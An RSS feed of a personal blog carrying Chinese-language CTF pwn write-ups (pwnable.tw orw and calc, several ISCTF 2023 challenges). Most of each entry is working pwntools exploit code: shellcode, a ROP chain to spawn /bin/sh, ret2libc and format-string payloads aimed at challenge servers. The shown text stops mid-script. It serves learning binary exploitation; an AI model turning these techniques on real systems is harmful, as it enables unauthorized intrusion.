<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>ccjssjdyka的博客</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>柴柴就是世界第一可爱！！!</description>
    <pubDate>Sat, 20 Jan 2024 04:06:29 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>pwnable-orw</title>
      <link>http://example.com/2024/01/20/pwnable-orw/</link>
      <guid>http://example.com/2024/01/20/pwnable-orw/</guid>
      <pubDate>Sat, 20 Jan 2024 03:42:57 GMT</pubDate>
      
      <description>&lt;p&gt;orw入门题&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>orw入门题</p><span id="more"></span><p>解法一：</p><p>我直接用shellcraft生成的shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x0804A060</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/home/orw/flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,addr,<span class="number">0x100</span>)+shellcraft.write(<span class="number">1</span>,addr,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,asm(shellcode))</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>解法二：</p><p>手搓汇编代码，这里我是直接复制大佬写的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov eax,0x5    </span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">push 0x67616c66 </span></span><br><span class="line"><span class="string">push 0x2f2f2f77 </span></span><br><span class="line"><span class="string">push 0x726f2f65 </span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x3     </span></span><br><span class="line"><span class="string">mov ecx, ebx</span></span><br><span class="line"><span class="string">mov ebx, 0x3</span></span><br><span class="line"><span class="string">mov edx, 0x50</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x4     </span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov edx,0x50</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, asm(shellcode))</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/20/pwnable-orw/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>pwnable-calc</title>
      <link>http://example.com/2024/01/18/pwnable-calc/</link>
      <guid>http://example.com/2024/01/18/pwnable-calc/</guid>
      <pubDate>Thu, 18 Jan 2024 10:14:46 GMT</pubDate>
      
      <description>&lt;p&gt;​		对于一个尚未入门的菜鸟来说，这道题刷新了我对漏洞利用的理解，赶巧碰上感冒，花了好几天结合大佬的wp才理清逻辑，那么废话不多说，直接开始解题。。。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>​对于一个尚未入门的菜鸟来说，这道题刷新了我对漏洞利用的理解，赶巧碰上感冒，花了好几天结合大佬的wp才理清逻辑，那么废话不多说，直接开始解题。。。</p><span id="more"></span><p>32位程序，没开PIE</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-1.png"></p><p>先来看主函数</p><p>ssignal和alarm没什么作用，只是限个时，fflush是清空缓冲区</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-2.png"></p><p>calc函数</p><p>bzero是置零，get_expr是获取不超过1024个字符，init_pool是初始化函数，等同于把v1数组置零</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-3.png"></p><p>重点是parse_expr函数，我在伪代码里面加上一些注释可以方便理解，由于变量比较多，我也是做了一些笔记避免我混淆，以下变量只讨论parse_expr函数，切记不可以和其他函数内的变量混淆</p><p>a2[0] 操作数个数<br>a2[a2[0]] 操作数<br>s1 临时变量，储存操作数<br>s 存储运算符(相当于栈)<br>s[v6] 相当于栈顶指针</p><p>函数的主逻辑是for循环，利用for循环检查每个字符，函数逻辑我均写为注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + a1) - <span class="number">48</span>) &gt; <span class="number">9</span> ) <span class="comment">//检查字符是否为运算符。如果字符是运算符，如+、-这些，减48后会变成负数，由于是unsigned int类型，该负数会变成很大的正整数，自然会大于9</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i + a1 - v4; <span class="comment">//统计长度，指数字的长度，如123的长度是3</span></span><br><span class="line">      s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);<span class="comment">//s1是临时变量，储存操作数</span></span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v4, v7);</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )<span class="comment">//如果操作数是0，则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);<span class="comment">//将字符&quot;123&quot;转化为整数123</span></span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*a2)++;</span><br><span class="line">        a2[v3 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + a1) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + <span class="number">1</span> + a1) - <span class="number">48</span>) &gt; <span class="number">9</span> )<span class="comment">//如果是连续的运算符，则报错</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = i + <span class="number">1</span> + a1; <span class="comment">// 与前面的v7相对应，用于计算操作数长度</span></span><br><span class="line">      <span class="keyword">if</span> ( s[v6] ) <span class="comment">// s[V6]相当于栈顶指针</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>: <span class="comment">// 如果字符为 &#x27;%&#x27;,&#x27;*&#x27;,&#x27;/&#x27; 则跳到 LABEL_14</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( s[v6] != <span class="number">43</span> &amp;&amp; s[v6] != <span class="number">45</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            s[++v6] = *(_BYTE *)(i + a1); <span class="comment">// 如果字符为&#x27;+&#x27;,&#x27;-&#x27;则添加进s，相当于入栈</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(a2, s[v6]);<span class="comment">//计算函数，a2里有操作数，s[v6]是运算符</span></span><br><span class="line">            s[v6] = *(_BYTE *)(i + a1);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(a2, s[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        s[v6] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以利用的漏洞点是在eval中，检查错误中没有检查像’+123\n’这种表达式，因此在这里它是合法的，如果我们输入’+123\n‘，那么在程序遇到’\n’结束前变量储存的值是这样的<br>a2[0] &#x3D; 1</p><p>a2[a2[0]] &#x3D; a2[1] &#x3D; 123</p><p>s[0] &#x3D; ‘+’</p><p>那么在eval计算时，则会执行下图第一个框内的代码，使得a2[0] &#x3D; 1 + 123 &#x3D; 124</p><p>a2是什么？正是我们的操作数个数，那么我们成功改变了操作数的个数，那我们就可以利用这个点就可以实现任意地址读和任意地址写了</p><p><img src="/../imgs/$%7Bfiilename%7D/pwnable-calc-4.png"></p><p>直接上exp，注释中有说明为什么这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10100</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;=== Welcome to SECPROG calculator ===&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;+360&#x27;</span>) <span class="comment">#为什么是360？回到calc函数中的v1,我们的操作数个数正是储存在v1[0],而v1[361]是ebp，如何计算？因为每个int占4个字节，所以0x5a0/4 = 360，那我们要泄露v1[361]的内容为什么要是360，因为按前面发送+123那里的逻辑来看，原本v1[0] = 1,因为有360这1个操作数，所以发送+360后，就可以利用该漏洞将原本的 v1[0] = 1 改成 v1[0] = 1 + 360 = 361 了</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    old_ebp = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;old_ebp:&quot;</span>,old_ebp)</span><br><span class="line"></span><br><span class="line">    gadget=[<span class="number">0x0805c34b</span>,<span class="number">0xb</span>,<span class="number">0x080701d0</span>,<span class="number">0</span>,<span class="number">0</span>,old_ebp,<span class="number">0x08049a21</span>,u32(<span class="string">&#x27;/bin&#x27;</span>),u32(<span class="string">&#x27;/sh\x00&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(gadget)): <span class="comment">#这个for循环是用于布置ROP，从v1[361]布置起，程序结束后执行rop</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i))</span><br><span class="line">        tmp=gadget[i]-<span class="built_in">int</span>(p.recvline())</span><br><span class="line">        <span class="keyword">if</span> tmp&gt;<span class="number">0</span>:</span><br><span class="line">            p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i)+<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(tmp))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.sendline(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(<span class="number">361</span>+i)+<span class="built_in">str</span>(tmp))</span><br><span class="line">        p.recvline()</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2024/01/18/pwnable-calc/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ISCTF 2023 wp pwn 部分题解</title>
      <link>http://example.com/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</link>
      <guid>http://example.com/2023/11/29/ISCTF-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</guid>
      <pubDate>Wed, 29 Nov 2023 02:34:22 GMT</pubDate>
      
      <description>&lt;h3 id=&quot;ezpie&quot;&gt;&lt;a href=&quot;#ezpie&quot; class=&quot;headerlink&quot; title=&quot;ezpie&quot;&gt;&lt;/a&gt;ezpie&lt;/h3&gt;&lt;p&gt;func函数地址被放入栈中，用fmt漏洞读出地址，然后算真实地址，泄露puts，匹配这个版本libc6_2.31-0ubuntu9.10_amd64的libc&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h3 id="ezpie"><a href="#ezpie" class="headerlink" title="ezpie"></a>ezpie</h3><p>func函数地址被放入栈中，用fmt漏洞读出地址，然后算真实地址，泄露puts，匹配这个版本libc6_2.31-0ubuntu9.10_amd64的libc</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">22453</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/ezpie&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">9</span>) + <span class="string">b&#x27;b&#x27;</span>) </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">func_addr_t = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;func_addr:%#x&quot;</span>, func_addr_t)</span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">pop_rdi = <span class="number">0x1333</span></span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">func_addr = elf.sym.func</span><br><span class="line">ret_addr = <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">pieBase = func_addr_t - func_addr</span><br><span class="line"></span><br><span class="line">pop_rdi_t =  pop_rdi + pieBase</span><br><span class="line">puts_got_t = puts_got + pieBase</span><br><span class="line">puts_plt_t = puts_plt + pieBase</span><br><span class="line">ret_addr_t = ret_addr + pieBase</span><br><span class="line"></span><br><span class="line">pad = offset + p64(pop_rdi_t) + p64(puts_got_t) + p64(puts_plt_t) + p64(func_addr_t)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please enter your information-&gt; &quot;</span>,pad)</span><br><span class="line">puts_addr= u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;puts_addr:%#x&quot;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">libc=  LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">libc_system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pad2 = offset + p64(ret_addr_t) + p64(pop_rdi_t) + p64(bin_sh_addr) + p64(libc_system)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please enter your information-&gt; &quot;</span>,pad2)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>v1和v2地址被放进栈里面，调试发现其为第8和第9个参数，把他们的值改成18和52就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">21001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;%18c%8$hhn%34c%9$hhn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><p>溢出字节为0x20，返回地址为第41个字节，利用for循环内的指针，输入28个字节后到达 i 的值，将 i 的值改成 0x27 ，也就是39，但s[39] 是第40个字节，循环后自动+1，所以下一个字节修改的是第41个字节，将第41和第42个字节替换为backdoor的地址，第43个字节一样就不用替换，然后就能返回backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;43.249.195.138&quot;</span>,<span class="number">22959</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012ee</span></span><br><span class="line"><span class="comment">#0x20 + 8 + 2 = 42</span></span><br><span class="line"><span class="comment">#0x20 - 4 = 28 </span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;42&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    p.send(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&quot;\x27&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;\xee&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span 